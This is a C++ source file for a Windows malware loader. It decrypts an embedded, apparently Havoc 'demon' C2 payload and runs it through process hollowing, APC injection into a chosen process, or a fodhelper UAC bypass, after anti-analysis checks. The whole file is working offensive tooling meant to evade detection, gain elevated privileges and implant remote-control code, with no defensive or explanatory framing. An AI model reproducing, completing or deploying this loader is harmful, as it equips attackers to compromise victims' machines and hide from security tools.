#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <windows.h>
#include "easCipher42.hpp"
#include "crypto_funcs.hpp"
#include "process_hollower.hpp"
#include "process_injection.hpp"
#include "bypass_analysis.hpp"
#include "uac_bypass.hpp"
#include "demon.x64.h"

struct Config {
    bool verbose = false;
    bool do_hollow = false;
    bool do_apc = false;
    bool do_uac = false;
    DWORD target_pid = 0;
    std::string target_process = "svchost.exe";
};

void print_usage(const char* prog) {
    std::cout << "Usage: " << prog << " [OPTIONS]\n";
    std::cout << "  -v, --verbose       Enable debug output\n";
    std::cout << "  -h, --hollow        Process hollowing (default)\n";
    std::cout << "  -p, --pid PID       APC injection into existing process\n";
    std::cout << "  -u, --uac           UAC bypass via fodhelper\n";
    std::cout << "  -a, --anti          Run anti-analysis checks\n";
    std::cout << "\nExamples:\n";
    std::cout << "  " << prog << " -v -h              (hollowing + debug)\n";
    std::cout << "  " << prog << " -v -p 1234         (APC inject PID 1234 + debug)\n";
    std::cout << "  " << prog << " -v -u -a           (UAC bypass + anti-checks + debug)\n";
}

Config parse_args(int argc, char* argv[]) {
    Config cfg;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];

        if (arg == "-v" || arg == "--verbose") {
            cfg.verbose = true;
        }
        else if (arg == "-h" || arg == "--hollow") {
            cfg.do_hollow = true;
        }
        else if (arg == "-p" || arg == "--pid") {
            if (i + 1 < argc) {
                try {
                    cfg.target_pid = std::stoul(argv[++i]);
                    cfg.do_apc = true;
                } catch (const std::invalid_argument& e) {
                    std::cerr << "[-] Invalid PID format: " << argv[i] << "\n";
                    print_usage(argv[0]);
                    exit(1);
                }
            } else {
                std::cerr << "[-] -p/--pid requires a PID argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "-u" || arg == "--uac") {
            cfg.do_uac = true;
        }
        else if (arg == "-a" || arg == "--anti") {
            // Anti-analysis will run if verbose (optional)
        }
        else if (arg == "-help" || arg == "--help") {
            print_usage(argv[0]);
            exit(0);
        }
    }

    // Default to hollowing if nothing specified
    if (!cfg.do_hollow && !cfg.do_apc && !cfg.do_uac) {
        cfg.do_hollow = true;
    }

    return cfg;
}

std::wstring ascii_to_wstring(const std::vector<uint8_t>& data) {
    std::string str;
    for (auto c : data) {
        if (c == '\0') break;
        str += (char)c;
    }

    int wide_size = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, nullptr, 0);
    std::wstring wstr(wide_size, 0);
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wstr[0], wide_size);
    return wstr;
}

int main(int argc, char* argv[]) {
    Config cfg = parse_args(argc, argv);

    if (cfg.verbose) std::cout << "\n=== AES LOADER ===\n";

    // 1. Run anti-analysis checks if verbose
    if (cfg.verbose) {
        BypassAnalysis bypass(true);
        if (!bypass.run_checks()) {
            return -1;
        }
    }

    // 2. Initialize cipher & decrypt
    easCipher42 cipher;
    if (!cipher.Init(payload_enc, payload_enc_len)) {
        std::cout << "[-] Cipher Init FAILED\n";
        return -1;
    }

    if (cfg.verbose) {
        std::cout << "[+] seed: " << bytes_to_hex(cipher.GetSeed(), 42) << "\n";
        std::cout << "[+] key: " << bytes_to_hex(cipher.GetKey(), 32) << "\n";
        std::cout << "[+] iv: " << bytes_to_hex(cipher.GetIV(), 16) << "\n\n";
    }

    // 3. Decrypt fodhelper path
    std::vector<uint8_t> fodpath;
    if (!cipher.Decrypt(fodhelper_enc, fodhelper_enc_len, fodpath)) {
        std::cout << "[-] Fodhelper decrypt FAILED\n";
        return -1;
    }

    if (cfg.verbose) {
        std::cout << "[+] Fodhelper path: ";
        for (auto c : fodpath) {
            if (c == '\0') break;
            std::cout << (char)c;
        }
        std::cout << "\n";
    }

    // 4. Decrypt payload
    std::vector<uint8_t> payload;
    if (!cipher.Decrypt(cipher.GetPayloadEncCiphertext(), cipher.GetPayloadEncCiphertextLen(), payload)) {
        std::cout << "[-] Payload decrypt FAILED\n";
        return -1;
    }

    if (cfg.verbose) {
        std::cout << "[+] Payload: " << payload.size() << " bytes\n";
        std::cout << "[+] Header: " << bytes_to_hex(payload.data(), 16) << "\n\n";
    }

    // 5. Execute injection method
    std::wstring fodpath_wide = ascii_to_wstring(fodpath);

    if (cfg.do_uac) {
        // UAC bypass mode
        std::cout << "[*] UAC bypass mode...\n";

        char loader_path[MAX_PATH];
        GetModuleFileNameA(NULL, loader_path, MAX_PATH);

        // Reconstruct args without -u flag
        std::string args;
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg != "-u" && arg != "--uac") {
                args += " " + arg;
            }
        }

        UACBypass uac(loader_path, args, cfg.verbose);
        if (uac.execute_fodhelper()) {
            std::cout << "[+] UAC bypass executed - fodhelper will relaunch elevated\n";
            Sleep(2000);
            return 0;
        } else {
            std::cout << "[-] UAC bypass FAILED\n";
            return -1;
        }
    }
    else if (cfg.do_apc) {
        // APC injection into existing process
        std::cout << "[*] APC injection mode (PID " << cfg.target_pid << ")...\n";

        ProcessInjection injector(cfg.verbose);
        if (injector.InjectViaAPC(cfg.target_pid, payload)) {
            std::cout << "[+] SUCCESS\n";
            return 0;
        } else {
            std::cout << "[-] FAILED\n";
            return -1;
        }
    }
    else if (cfg.do_hollow) {
        // Process hollowing
        std::cout << "[*] Hollowing mode...\n";

        ProcessHollower hollower(cfg.verbose);
        if (hollower.HollowProcess(fodpath_wide.c_str(), payload)) {
            std::cout << "[+] SUCCESS\n";
            return 0;
        } else {
            std::cout << "[-] FAILED\n";
            return -1;
        }
    }

    return 0;
}
